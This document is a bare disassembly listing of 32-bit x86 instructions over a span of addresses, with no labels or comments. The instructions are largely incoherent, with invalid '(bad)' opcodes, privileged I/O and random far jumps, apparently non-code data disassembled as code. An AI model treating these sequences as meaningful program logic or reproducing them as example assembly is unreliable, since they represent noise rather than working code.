  4289a8:	ror    DWORD PTR [ebx+0x51],cl
  4289ab:	mov    edx,0x50a5d5d5
  4289b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289b1:	rcl    BYTE PTR [esi-0x7db3b0d2],cl
  4289b7:	dec    ebx
  4289b8:	cmp    al,BYTE PTR [esi+0x64]
  4289bb:	call   0x36d8:0x609bf41b
  4289c2:	jbe    0x428953
  4289c4:	xor    BYTE PTR [esi+0x352bfad6],bh
  4289ca:	fwait
  4289cb:	jle    0x4289be
  4289cd:	popf   
  4289ce:	and    eax,0x9a07217b
  4289d3:	xor    eax,0x7a5b6f4e
  4289d8:	(bad)  
  4289d9:	push   es
  4289da:	xchg   BYTE PTR [eax],dl
  4289dc:	push   eax
  4289dd:	call   0x63c71dca
  4289e2:	ss inc esi
  4289e4:	in     eax,dx
  4289e5:	stos   DWORD PTR es:[edi],eax
  4289e6:	(bad)  
  4289e7:	lods   al,BYTE PTR ds:[esi]
  4289e8:	mov    al,0xf4
  4289ea:	outs   dx,BYTE PTR ds:[esi]
  4289eb:	xchg   ebx,eax
  4289ec:	cmp    DWORD PTR [edi+0x41],0xe007ecd9
  4289f3:	lea    edi,[ebx+ecx*4]
  4289f6:	sub    al,0x71
  4289f8:	mov    edx,0xcc199f72
  4289fd:	inc    ebp
  4289fe:	push   ss
  4289ff:	inc    esi
  428a00:	icebp  
  428a01:	dec    ebp
  428a02:	dec    esp
  428a03:	and    al,0xc
  428a05:	sar    DWORD PTR [eax+edx*4-0x7c08a92],cl
  428a0c:	pop    ss
  428a0d:	pop    ss
  428a0e:	push   ebx
  428a0f:	mov    cs,WORD PTR fs:[ecx+edx*8-0x7b637f93]
  428a17:	(bad)  
  428a18:	cmp    eax,edx
  428a1a:	data16 mov ch,0xca
  428a1d:	fstp   QWORD PTR ds:0x178377dc
  428a23:	adc    bl,0x38
  428a26:	jmp    DWORD PTR [esi+0x26]
  428a29:	outs   dx,DWORD PTR ds:[esi]
  428a2a:	lahf   
  428a2b:	and    al,0x6b
  428a2d:	cmp    ebp,esi
  428a2f:	xor    cl,BYTE PTR [eax]
  428a31:	jb     0x428a5f
  428a33:	sti    
  428a34:	iret   
  428a35:	mov    edx,DWORD PTR ds:0x8d705bd2
  428a3b:	aaa    
  428a3c:	ror    DWORD PTR [ebp+esi*8+0xdc0054],cl
	...
  428ab3:	add    dl,cl
  428ab5:	mov    edx,DWORD PTR [edx+0x7b]
  428ab8:	push   ebx
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0x8ad3f691
  428ac2:	aas    
  428ac3:	cmp    ecx,DWORD PTR [esi-0x50]
  428ac6:	add    DWORD PTR [eax],eax
  428ac8:	test   BYTE PTR [eax],0x0
  428acb:	add    dh,al
  428acd:	lds    edi,FWORD PTR [edx+0x96a77e4]
  428ad3:	push   cs
  428ad4:	ret    0x7d2f
  428ad7:	or     al,BYTE PTR [esi]
  428ad9:	dec    ebp
  428ada:	aam    0x25
  428adc:	inc    esp
  428add:	lods   eax,DWORD PTR ds:[esi]
  428ade:	pop    esp
  428adf:	in     al,dx
  428ae0:	or     al,0xf7
  428ae2:	jmp    0x7ec4c7d
  428ae7:	fmul   QWORD PTR [ebx-0x45]
  428aea:	push   ecx
  428aeb:	cli    
  428aec:	jp     0x428b33
  428aee:	or     DWORD PTR [ebx-0x2468d203],0x2f3a7e0b
  428af8:	into   
  428af9:	iret   
  428afa:	rcr    BYTE PTR [edi-0x25],1
  428afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428afe:	jge    0x428aa6
  428b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b01:	mov    ch,0x9c
  428b04:	xchg   BYTE PTR [edx],bl
  428b06:	cwde   
  428b07:	or     ch,dh
  428b09:	xor    DWORD PTR [ebx+0x3f],edx
  428b0c:	mov    esi,DWORD PTR [edx]
  428b0e:	stos   BYTE PTR es:[edi],al
  428b0f:	xchg   esp,eax
  428b10:	ret    
  428b11:	jbe    0x428b2a
  428b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b14:	cmp    DWORD PTR [esi+0x6e],ecx
  428b17:	or     edi,DWORD PTR [edi-0x17d749cf]
  428b1d:	enter  0xa3f3,0x69
  428b21:	add    ecx,DWORD PTR [eax+eax*8-0xd]
  428b25:	loop   0x428ab0
  428b27:	sub    BYTE PTR [esi+0x59],bl
  428b2a:	addr16 mov dl,0xe7
  428b2d:	mov    edi,0x934bca8b
  428b32:	test   BYTE PTR [ebx],0xe9
  428b35:	sbb    al,0x15
  428b37:	add    eax,0x134d5a28
  428b3c:	pop    edi
  428b3d:	fld    TBYTE PTR es:[edx-0x3781f567]
  428b44:	cdq    
  428b45:	jne    0x428ba8
  428b47:	or     al,0x9e
  428b49:	push   0xef585649
  428b4e:	outs   dx,DWORD PTR ds:[esi]
  428b4f:	into   
  428b50:	jmp    0x428ba3
  428b52:	push   0x2f
  428b54:	sbb    bl,BYTE PTR [esi]
  428b56:	jo     0x428b0e
  428b58:	lds    esi,FWORD PTR [esi]
  428b5a:	cmp    al,cl
  428b5c:	out    dx,eax
  428b5d:	push   ecx
  428b5e:	sub    edi,DWORD PTR [edi-0x2072e92f]
  428b64:	cdq    
  428b65:	jecxz  0x428bbd
  428b67:	inc    DWORD PTR [edx]
  428b69:	enter  0xe2b6,0x8e
  428b6d:	xlat   BYTE PTR ds:[ebx]
  428b6e:	dec    ebx
  428b6f:	pop    ebx
  428b70:	xor    eax,0x44c87f59
  428b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428b76:	in     eax,dx
  428b77:	test   eax,0xa94c4f9f
  428b7c:	retf   0xe0c5
  428b7f:	nop
  428b80:	xor    al,0xae
  428b82:	pop    edx
  428b83:	push   eax
  428b84:	das    
  428b85:	push   es
  428b86:	jmp    0x9fd6ab8a
  428b8b:	scas   al,BYTE PTR es:[edi]
  428b8c:	pusha  
  428b8d:	das    
  428b8e:	lods   eax,DWORD PTR ds:[esi]
  428b8f:	mov    esi,0x23fe6117
  428b94:	sbb    edi,esi
  428b96:	or     cl,BYTE PTR [eax]
  428b98:	aad    0x59
  428b9a:	ror    BYTE PTR [edi-0x16962d12],cl
  428ba0:	scas   al,BYTE PTR es:[edi]
  428ba1:	test   dh,0x91
  428ba4:	push   eax
  428ba5:	stos   DWORD PTR es:[edi],eax
  428ba6:	cs jbe 0x428b76
  428ba9:	loopne 0x428b8a
  428bab:	cli    
  428bac:	cmp    eax,0x2f016cad
  428bb1:	dec    ebx
  428bb3:	scas   al,BYTE PTR es:[edi]
  428bb4:	xchg   esi,eax
  428bb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428bb6:	mov    ebx,esp
  428bb8:	cmp    eax,0xdbdbfc17
  428bbd:	es test eax,0x49a961
	...
  428c33:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0xfcd7a28f
  428c41:	fstp   DWORD PTR [ebx]
  428c43:	dec    edi
  428c44:	inc    esp
  428c45:	mov    cl,0x1
  428c47:	add    dh,dh
  428c49:	add    BYTE PTR [eax],al
  428c4b:	add    BYTE PTR [edx-0x7b],dh
  428c4e:	inc    esi
  428c4f:	inc    ecx
  428c50:	pop    edx
  428c51:	aad    0xb7
  428c53:	in     eax,0xcd
  428c55:	call   0x1998:0x93031c84
  428c5c:	rol    BYTE PTR [eax+0x2d1e2669],cl
  428c62:	pusha  
  428c63:	xchg   ecx,eax
  428c64:	or     al,0xe4
  428c66:	inc    esp
  428c67:	outs   dx,DWORD PTR ds:[esi]
  428c68:	loopne 0x428ccc
  428c6a:	out    dx,eax
  428c6b:	jp     0x428c01
  428c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c6e:	cmp    bl,BYTE PTR [eax-0x4d]
  428c71:	adc    al,0xf8
  428c73:	and    al,0xb3
  428c75:	js     0x428cda
  428c77:	pop    esp
  428c78:	mov    ds:0x54f92b3f,al
  428c7d:	lods   al,BYTE PTR ds:[esi]
  428c7e:	mov    al,ds:0xf2f3b7a0
  428c83:	jnp    0x428cf9
  428c85:	mov    ebp,0xb5b6cbb0
  428c8a:	popa   
  428c8b:	jg     0x428c53
  428c8d:	and    bl,BYTE PTR [edx-0x62d5fed0]
  428c93:	mov    DWORD PTR [edx-0x4775d277],edi
  428c99:	inc    ebx
  428c9a:	retf   
  428c9b:	in     eax,0x56
  428c9d:	sar    BYTE PTR [edi-0x63c85e0b],cl
  428ca3:	popa   
  428ca4:	scas   al,BYTE PTR es:[edi]
  428ca5:	dec    ebp
  428ca6:	jle    0x428c2b
  428ca8:	ret    0xd1a0
  428cab:	sub    edi,DWORD PTR [esi]
  428cad:	rol    DWORD PTR [ebx-0x76],1
  428cb0:	push   es
  428cb1:	jnp    0x428ce9
  428cb3:	adc    dh,0x1f
  428cb6:	shl    BYTE PTR [edx],cl
  428cb8:	push   es
  428cb9:	mov    al,ds:0x52f1b85b
  428cbe:	and    esi,DWORD PTR [ecx]
  428cc0:	(bad)  
  428cc1:	out    0x9a,al
  428cc3:	call   0x738971f8
  428cc8:	inc    esi
  428cc9:	fdivr  QWORD PTR [edi-0x35]
  428ccc:	sbb    DWORD PTR [edi+0x209e98aa],edi
  428cd2:	xchg   ebx,eax
  428cd3:	call   0x25ef:0xd03d4484
  428cda:	jle    0x428c75
  428cdc:	mov    DWORD PTR [esi+0x65d71efa],ebx
  428ce2:	push   0xb0b8ed55
  428ce7:	shl    DWORD PTR [ebp-0x48],0x3f
  428ceb:	in     eax,dx
  428cec:	and    al,0x68
  428cee:	xchg   edi,eax
  428cef:	push   edx
  428cf0:	push   edx
  428cf1:	push   0xffffffec
  428cf3:	out    dx,al
  428cf4:	cmp    ebp,edi
  428cf6:	call   0x6454:0x9c5b779c
  428cfd:	mov    esi,0x12cea316
  428d02:	in     eax,dx
  428d03:	adc    BYTE PTR [ebx],cl
  428d05:	(bad)  
  428d06:	fist   DWORD PTR [eax]
  428d08:	scas   eax,DWORD PTR es:[edi]
  428d09:	sbb    ecx,DWORD PTR [ebx+0x3d]
  428d0c:	jmp    0x428d76
  428d0e:	push   ss
  428d0f:	imul   esp,DWORD PTR [ebp+0x47be0e38],0x1c746738
  428d19:	pxor   mm1,QWORD PTR [edi+0x54056e91]
  428d20:	imul   BYTE PTR [eax+0x745f4d50]
  428d26:	sub    bh,dl
  428d28:	fs ja  0x428d1a
  428d2b:	mov    ds:0x5328813e,al
  428d30:	ret    0x9756
  428d33:	out    0x55,eax
  428d35:	or     al,0x89
  428d37:	pusha  
  428d38:	dec    ebp
  428d39:	jmp    0xf0972482
  428d3e:	lea    esp,[edi+0x6f]
  428d41:	jne    0x428d43
	...
  428db3:	add    BYTE PTR [eax+0x6d3c25f1],bh
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0xe525d6a1
  428dc4:	cmp    dh,BYTE PTR [edx+0xf60001]
  428dca:	add    BYTE PTR [eax],al
  428dcc:	jl     0x428def
  428dce:	add    al,0x69
  428dd0:	rol    BYTE PTR [esi],1
  428dd2:	repnz lahf 
  428dd4:	dec    edi
  428dd5:	sbb    BYTE PTR [edx],0x58
  428dd8:	das    
  428dd9:	out    dx,al
  428dda:	leave  
  428ddb:	(bad)  
  428ddc:	out    0xff,al
  428dde:	ins    DWORD PTR es:[edi],dx
  428ddf:	test   DWORD PTR [ebx],0x88f72ee0
  428de5:	lods   eax,DWORD PTR ds:[esi]
  428de6:	hlt    
  428de7:	in     al,dx
  428de8:	or     ah,BYTE PTR [eax]
  428dea:	push   cs
  428deb:	jecxz  0x428e26
  428ded:	imul   eax,DWORD PTR [ebp+0x2a8e4c23],0xffffffa4
  428df4:	lds    edi,FWORD PTR [esi+0x72]
  428df7:	jmp    0x428e0e
  428df9:	mov    ah,0xe9
  428dfb:	or     eax,0xb9a22df8
  428e00:	mov    edi,0xb7bf83c4
  428e05:	cli    
  428e06:	out    0x12,al
  428e08:	jne    0x428e57
  428e0a:	bound  esp,QWORD PTR [esi+0xf]
  428e0d:	xchg   ebx,eax
  428e0e:	mov    esi,0x6d55ad40
  428e13:	push   ss
  428e14:	mov    esp,DWORD PTR [esi]
  428e16:	sbb    cl,BYTE PTR [ebx-0x10]
  428e19:	or     al,0x8a
  428e1b:	or     BYTE PTR [esi-0x226e8dbe],dh
  428e21:	cmp    eax,0xd4df8e6e
  428e26:	fimul  DWORD PTR [edi-0x1f]
  428e29:	retf   
  428e2a:	cmc    
  428e2b:	ins    DWORD PTR es:[edi],dx
  428e2c:	cmp    al,0x15
  428e2e:	jo     0x428e7e
  428e30:	dec    ebp
  428e31:	in     eax,dx
  428e32:	js     0x428de5
  428e34:	das    
  428e35:	push   eax
  428e36:	xchg   edx,eax
  428e37:	mov    eax,0x484cb585
  428e3c:	xchg   ebp,eax
  428e3d:	dec    esp
  428e3e:	xchg   edx,eax
  428e3f:	add    DWORD PTR [edx],ebx
  428e41:	into   
  428e42:	out    dx,al
  428e43:	mov    al,0x8a
  428e45:	shr    bh,cl
  428e47:	sbb    eax,0xc3f0259d
  428e4c:	or     eax,0x8de26ddd
  428e51:	jae    0x428dd4
  428e53:	into   
  428e54:	pop    ds
  428e55:	into   
  428e56:	(bad)  
  428e57:	(bad)
  428e5a:	adc    bh,BYTE PTR [ebp+eax*2-0x67]
  428e5e:	in     eax,0xbc
  428e60:	(bad)  
  428e61:	in     eax,dx
  428e62:	add    al,0xa3
  428e64:	adc    al,0xb9
  428e66:	bswap  ecx
  428e68:	int    0x32
  428e6a:	ret    0xe33c
  428e6d:	loopne 0x428eb4
  428e6f:	pop    eax
  428e70:	icebp  
  428e71:	stos   DWORD PTR es:[edi],eax
  428e72:	push   0xc5db9975
  428e77:	test   BYTE PTR [esi],ch
  428e79:	in     al,dx
  428e7a:	mov    edi,0x2526edd1
  428e7f:	data16 lods al,BYTE PTR ds:[esi]
  428e81:	inc    edx
  428e82:	ror    BYTE PTR [ecx+edx*4],1
  428e85:	mov    al,ds:0x34a8c0b7
  428e8a:	adc    DWORD PTR ds:0x9325bbe4,ecx
  428e90:	adc    al,0x1
  428e92:	pop    ss
  428e93:	pop    ebx
  428e94:	push   ebx
  428e95:	or     edx,eax
  428e97:	add    BYTE PTR [ebx-0x65],ch
  428e9a:	or     BYTE PTR [eax+0x3f],0xbe
  428e9e:	sub    dh,cl
  428ea0:	pop    edi
  428ea1:	hlt    
  428ea2:	jbe    0x428e31
  428ea4:	aas    
  428ea5:	xchg   esp,eax
  428ea6:	in     al,0xf4
  428ea8:	mov    ?,WORD PTR [ecx]
  428eaa:	cwde   
  428eab:	mov    ds:0xf2cb407a,eax
  428eb0:	cmc    
  428eb1:	fdiv   st(3),st
  428eb3:	les    eax,FWORD PTR [esi]
  428eb5:	(bad)  
  428eb6:	retf   
  428eb7:	pop    ds
  428eb8:	out    0x23,al
  428eba:	sub    edx,DWORD PTR [ebp-0x1e]
  428ebd:	push   esp
  428ebe:	lea    edi,ds:0xc86
	...
  428f34:	mov    cl,0xa7
  428f36:	dec    ebx
  428f37:	das    
  428f38:	pop    edi
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	mov    ds:0x3091d476,al
  428f45:	mov    bl,0x1
  428f47:	add    dh,dh
  428f49:	add    BYTE PTR [eax],al
  428f4b:	add    BYTE PTR [eax+0x7b673886],dh
  428f51:	stc    
  428f52:	pop    esi
  428f53:	(bad)  
  428f55:	or     ch,BYTE PTR [esi+edi*2-0x15]
  428f59:	scas   eax,DWORD PTR es:[edi]
  428f5a:	stos   BYTE PTR es:[edi],al
  428f5b:	inc    edx
  428f5c:	pop    eax
  428f5d:	push   cs
  428f5e:	repz pop ds
  428f60:	shr    BYTE PTR [ebp-0x24],cl
  428f63:	add    ebx,DWORD PTR [edi-0x22]
  428f66:	ss sub eax,0x1d8f7af6
  428f6c:	push   es
  428f6d:	loope  0x428fe5
  428f6f:	out    0xd8,eax
  428f71:	jae    0x428f0f
  428f73:	lods   al,BYTE PTR ds:[esi]
  428f74:	push   edx
  428f75:	mov    bh,cl
  428f77:	fdiv   QWORD PTR [ebx-0x1e1f50d2]
  428f7d:	jmp    0xc946a5b8
  428f82:	ss adc ecx,eax
  428f85:	ins    DWORD PTR es:[edi],dx
  428f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f87:	rol    esp,cl
  428f89:	mov    esp,0x6cddd279
  428f8e:	push   0x5d
  428f90:	imul   ecx,DWORD PTR [ebp+edi*4-0x2ba088be],0x1a
  428f98:	add    edx,DWORD PTR [edi]
  428f9a:	jo     0x428f67
  428f9c:	ret    0x9c69
  428f9f:	inc    esp
  428fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fa1:	les    ebx,FWORD PTR [eax]
  428fa3:	jns    0x428f99
  428fa5:	add    al,0xe3
  428fa7:	mov    DWORD PTR [ebp+ebx*2-0x178a487c],0x958ad5ea
  428fb2:	or     eax,0x5678f057
  428fb7:	pushf  
  428fb8:	sub    bh,BYTE PTR es:[edx+0x1f1192d0]
  428fbf:	dec    esp
  428fc0:	sbb    dl,BYTE PTR [ecx-0x6a]
  428fc3:	mov    BYTE PTR [esp+esi*8+0x9427a61],ch
  428fca:	(bad)  
  428fcc:	inc    ecx
  428fcd:	addr16 inc edx
  428fcf:	and    eax,0xa63ef86d
  428fd4:	push   edx
  428fd5:	push   ecx
  428fd6:	or     DWORD PTR [ebp+0xb],esp
  428fd9:	push   ecx
  428fda:	sub    al,0xdd
  428fdc:	repz out dx,eax
  428fde:	fiadd  DWORD PTR [eax+0x7a]
  428fe1:	lahf   
  428fe2:	lahf   
  428fe3:	cmp    esi,ebx
  428fe5:	out    dx,eax
  428fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fe7:	push   es
  428fe8:	cld    
  428fe9:	cmp    edx,esi
  428feb:	retf   0x5aac
  428fee:	sbb    al,al
  428ff0:	repnz shr dh,cl
  428ff3:	popfw  
  428ff5:	outs   dx,BYTE PTR ds:[esi]
  428ff6:	adc    eax,0x2f71bec
  428ffb:	xchg   esp,eax
  428ffc:	inc    esi
  428ffd:	sub    al,0x5e
  428fff:	ret    0xe63a
  429002:	test   eax,0xee113555
  429007:	adc    al,0xbc
  429009:	shr    DWORD PTR [esi+0x3c2f045a],1
  42900f:	repz pop ebx
  429011:	xchg   DWORD PTR [esi+0x5a7eb69a],edi
  429017:	dec    DWORD PTR [ecx-0x25b07c08]
  42901d:	pop    edi
  42901e:	mov    edx,0x336f03ab
  429023:	pop    ecx
  429024:	sbb    al,0x94
  429026:	loope  0x429088
  429028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429029:	sub    eax,0xb0134eda
  42902e:	sbb    DWORD PTR [edx-0x6f],esp
  429031:	in     eax,0xc8
  429033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429034:	xlat   BYTE PTR ds:[ebx]
  429035:	call   0xa39f530a
  42903a:	repz pop es
  42903c:	into   
  42903d:	push   ebp
  42903e:	ins    DWORD PTR es:[edi],dx
  42903f:	adc    BYTE PTR [ecx+0xd5],bl
	...
  4290b1:	add    BYTE PTR [eax],al
  4290b3:	add    bh,bl
  4290b5:	out    dx,al
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0x6bb66cf7
  4290c1:	pop    ds
  4290c2:	pop    edi
  4290c3:	mov    al,0x26
  4290c5:	mov    ah,0x1
  4290c7:	add    dh,dh
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    al,dl
  4290cd:	sub    bl,al
  4290cf:	call   0xf9a4:0x6ace5e80
  4290d6:	sbb    BYTE PTR [esi+0x62],bl
  4290d9:	xor    eax,0xcf84b7f7
  4290de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290df:	sub    cl,BYTE PTR [eax-0x4f674213]
  4290e5:	lods   eax,DWORD PTR ds:[esi]
  4290e6:	call   0x2d779ec6
  4290eb:	(bad)  
  4290ec:	test   DWORD PTR [ebx],ebp
  4290ee:	inc    ebx
  4290ef:	dec    esi
  4290f0:	daa    
  4290f1:	jp     0x429151
  4290f3:	mov    esp,edx
  4290f5:	jg     0x429155
  4290f7:	inc    esi
  4290f8:	pop    ebp
  4290f9:	popf   
  4290fa:	jne    0x4290ce
  4290fc:	mov    ah,0x35
  4290fe:	push   esi
  4290ff:	add    eax,0xf1f0e742
  429104:	inc    ebp
  429105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429106:	outs   dx,BYTE PTR ds:[esi]
  429107:	clc    
  429108:	test   al,0x5d
  42910a:	dec    eax
  42910b:	cwde   
  42910c:	hlt    
  42910d:	xchg   esi,eax
  42910e:	leave  
  42910f:	jl     0x429173
  429111:	hlt    
  429112:	retf   
  429113:	xor    cl,ch
  429115:	mov    ch,BYTE PTR [edi+0x13bc0f23]
  42911b:	hlt    
  42911c:	xlat   BYTE PTR ds:[ebx]
  42911d:	mov    ds:0xe7c0e75b,al
  429122:	loope  0x42910c
  429124:	pop    ecx
  429125:	sbb    BYTE PTR fs:[eax+0x5410040b],ch
  42912c:	popf   
  42912d:	push   ds
  42912e:	xchg   esp,eax
  42912f:	lahf   
  429130:	push   ebx
  429131:	int3   
  429132:	aad    0xb9
  429134:	loopne 0x4290b6
  429136:	out    0x42,al
  429138:	repz pop ecx
  42913a:	ror    BYTE PTR [ebx],cl
  42913c:	adc    ebx,DWORD PTR [esi+0x58]
  42913f:	ja     0x429134
  429141:	hlt    
  429142:	ret    0x3dab
  429145:	and    ah,BYTE PTR [eax]
  429147:	push   0x63
  429149:	inc    esp
  42914a:	and    al,cl
  42914c:	retf   
  42914d:	xchg   edi,eax
  42914e:	ret    
  42914f:	xchg   ebp,eax
  429150:	jae    0x42915e
  429152:	inc    eax
  429153:	jmp    0x4291c2
  429155:	jmp    0x450c:0xe7e13f52
  42915c:	cs dec ebx
  42915e:	call   0x7c60b623
  429163:	add    eax,DWORD PTR [esi-0x529aade7]
  429169:	or     DWORD PTR [esi-0x64fb31c2],ebp
  42916f:	(bad)  
  429171:	fisub  DWORD PTR [ebx-0x60]
  429174:	loope  0x4291ec
  429176:	test   al,0x8a
  429178:	fist   WORD PTR [esi-0x4e1e065c]
  42917e:	sbb    al,bh
  429180:	inc    edx
  429181:	out    dx,eax
  429182:	lods   al,BYTE PTR ds:[esi]
  429183:	add    bh,BYTE PTR [eax-0x6]
  429186:	imul   edi,ecx,0xffffffbd
  429189:	aam    0xdd
  42918b:	out    dx,eax
  42918c:	add    BYTE PTR [edi],cl
  42918e:	cmp    esi,DWORD PTR [ecx]
  429190:	mov    esi,0xaed494af
  429195:	pop    esp
  429196:	repnz xchg edx,eax
  429198:	push   ebx
  429199:	dec    edi
  42919a:	es push esi
  42919c:	call   0x31a5:0x7aafd691
  4291a3:	jb     0x429191
  4291a5:	or     BYTE PTR [edi],0x1b
  4291a8:	int3   
  4291a9:	ss hlt 
  4291ab:	xor    eax,0xa7610c98
  4291b0:	inc    esi
  4291b1:	cld    
  4291b2:	sbb    ch,BYTE PTR [edi-0x472d6717]
  4291b8:	ds loope 0x429168
  4291bb:	push   ebx
  4291bc:	sbb    eax,0x5192e3e3
  4291c1:	mov    eax,ds:0x0
	...
  429232:	add    BYTE PTR [eax],al
  429234:	(bad)  
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	jno    0x42928f
  429242:	add    BYTE PTR [eax],0x1c
  429245:	mov    ch,0x1
  429247:	add    dh,dh
  429249:	add    BYTE PTR [eax],al
  42924b:	add    ch,cl
  42924d:	neg    cl
  42924f:	adc    edx,DWORD PTR [ecx-0x5e]
  429252:	lock scas eax,DWORD PTR es:[edi]
  429254:	mov    dl,0xaa
  429256:	dec    edi
  429257:	(bad)  
  429258:	shr    BYTE PTR [esi+0x3060afe6],cl
  42925e:	pop    edi
  42925f:	lahf   
  429260:	mov    edi,0xdd58dbca
  429265:	or     al,0x46
  429267:	mov    ebx,0x5281ef99
  42926c:	pop    esp
  42926d:	pop    ss
  42926e:	ficom  DWORD PTR [esi+ecx*1+0x4]
  429272:	stos   DWORD PTR es:[edi],eax
  429273:	push   es
  429274:	repz ret 0x12c3
  429278:	paddq  mm0,QWORD PTR [ebx+0xc351094]
  42927f:	jmp    0x344508eb
  429284:	scas   eax,DWORD PTR es:[edi]
  429285:	icebp  
  429286:	mov    eax,DWORD PTR [edx+0x3004cb03]
  42928c:	jbe    0x4292c8
  42928e:	pop    ebp
  42928f:	out    0x90,eax
  429291:	call   0x9a95:0xc5a2c52c
  429298:	mov    ah,0xfb
  42929a:	enter  0x532c,0xec
  42929e:	test   al,0x11
  4292a0:	adc    al,0x6b
  4292a2:	mov    edi,DWORD PTR [edi]
  4292a4:	and    al,0x44
  4292a6:	outs   dx,DWORD PTR ds:[esi]
  4292a7:	dec    ebx
  4292a8:	sbb    ebx,DWORD PTR [ebx+0x69]
  4292ab:	das    
  4292ac:	mov    esp,?
  4292ae:	mov    eax,DWORD PTR [esi+ecx*4]
  4292b1:	mov    edx,0x77b8a818
  4292b6:	push   ebx
  4292b7:	cmp    BYTE PTR [ebx+0xf97d2ed],bl
  4292bd:	popa   
  4292be:	lahf   
  4292bf:	imul   ebp,DWORD PTR [ebp-0x9],0x7b
  4292c3:	sbb    ah,ah
  4292c5:	xor    dh,BYTE PTR [ebp+eax*1+0x63bb9fcc]
  4292cc:	push   ss
  4292cd:	xchg   BYTE PTR [esi-0x347ce3ec],dl
  4292d3:	sti    
  4292d4:	(bad)  
  4292d6:	or     eax,0x7814b53b
  4292db:	gs mov dl,0x3c
  4292de:	pop    ebx
  4292df:	jae    0x42928d
  4292e1:	and    BYTE PTR ds:0x154aa70b,dh
  4292e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292e8:	aaa    
  4292e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292ea:	dec    ebp
  4292eb:	push   ss
  4292ec:	xchg   edx,eax
  4292ed:	pushf  
  4292ee:	lea    ebx,[ecx+edi*8]
  4292f1:	test   BYTE PTR [esi-0x1efbfd5f],cl
  4292f7:	xchg   esp,eax
  4292f8:	mov    ebp,0xd48a7cc6
  4292fd:	sti    
  4292fe:	or     BYTE PTR [ecx-0x54],ah
  429301:	jae    0x429379
  429303:	dec    esp
  429304:	imul   ecx,DWORD PTR [esi+esi*8-0x2d91963d],0xffffffb2
  42930c:	ret    
  42930d:	ja     0x42932c
  42930f:	dec    edx
  429310:	das    
  429311:	out    dx,eax
  429312:	add    ebx,DWORD PTR [ebx]
  429314:	mov    edi,0xa73bd5f8
  429319:	or     dl,BYTE PTR [eax]
  42931b:	retf   
  42931c:	rcr    ebx,1
  42931e:	jp     0x429333
  429320:	cwde   
  429321:	mul    al
  429323:	xor    DWORD PTR [esi-0x7a8a42b5],esi
  429329:	adc    eax,0x78369e65
  42932e:	aam    0xd0
  429330:	sbb    eax,0x46b7f886
  429336:	sbb    cl,0xc1
  429339:	lock sub BYTE PTR [esi-0x59],dh
  42933d:	dec    ebx
  42933e:	scas   al,BYTE PTR es:[edi]
  42933f:	or     BYTE PTR [eax],dh
  429341:	pop    es
	...
  4293b2:	add    BYTE PTR [eax],al
  4293b4:	push   cs
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	adc    BYTE PTR [eax],0xea
  4293c3:	mov    esp,0x1b612
  4293c8:	test   BYTE PTR [eax],0x0
  4293cb:	add    BYTE PTR [edi-0x7340eab7],cl
  4293d1:	pop    edi
  4293d2:	push   eax
  4293d3:	nop
  4293d4:	aad    0xb1
  4293d6:	cld    
  4293d7:	pushf  
  4293d8:	xlat   BYTE PTR ds:[ebx]
  4293d9:	loope  0x429380
  4293db:	out    dx,al
  4293dc:	push   ebx
  4293dd:	das    
  4293de:	sub    al,0x6d
  4293e0:	adc    al,0x98
  4293e2:	iret   
  4293e3:	(bad)  
  4293e4:	dec    edx
  4293e5:	xor    esi,DWORD PTR [ebx-0x4fa11f1c]
  4293eb:	mov    edx,DWORD PTR [edx-0xddbfb7e]
  4293f1:	rcr    ah,0xff
  4293f4:	inc    esi
  4293f5:	cdq    
  4293f6:	sub    DWORD PTR [esi],eax
  4293f8:	pop    ebx
  4293f9:	sti    
  4293fa:	add    ebx,ebp
  4293fc:	data16 mov cl,0xcf
  4293ff:	mov    ds:0x7af434db,al
  429404:	fld    QWORD PTR [ebx+0x5b8fe111]
  42940a:	add    ebx,DWORD PTR [eax+0x4554d205]
  429410:	ss pop ss
  429412:	loopne 0x42942d
  429414:	ret    0xa2f1
  429417:	mov    WORD PTR [esi+0x2a03d879],?
  42941d:	pusha  
  42941e:	jmp    0xbe6f:0x3c7ee342
  429425:	add    BYTE PTR [esp+edx*2],bh
  429428:	xor    al,0x93
  42942a:	aas    
  42942b:	sub    cl,0xa6
  42942e:	sbb    al,BYTE PTR [ebx]
  429430:	std    
  429431:	adc    esi,edi
  429433:	std    
  429434:	je     0x42940a
  429436:	inc    edi
  429437:	jns    0x42946d
  429439:	mov    ch,0x55
  42943b:	out    0xdd,eax
  42943d:	sub    edx,DWORD PTR [ebp-0x2]
  429440:	sub    al,0xe0
  429442:	frstor [esp+eiz*2+0x71]
